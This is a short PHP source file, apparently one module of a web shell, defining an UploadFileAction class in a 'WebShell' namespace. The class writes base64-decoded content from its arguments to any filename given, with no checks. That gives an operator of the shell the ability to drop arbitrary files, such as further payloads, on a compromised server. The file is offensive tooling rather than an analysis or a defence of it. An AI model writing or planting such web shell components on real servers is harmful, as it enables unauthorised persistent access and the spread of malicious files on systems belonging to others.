<?php
namespace WebShell;

class UploadFileAction implements Action
{
    public function run(object $args): string
    {
        // Create the target file
        $mode = $args->binary ? 'wb' : 'w';
        $fd = fopen($args->filename, $mode);

        // Decode the content and write it to the file
        $content = base64_decode($args->content);
        fwrite($fd, $content);
        fclose($fd);

        // Return an empty string
        return '';
    }
}
?>
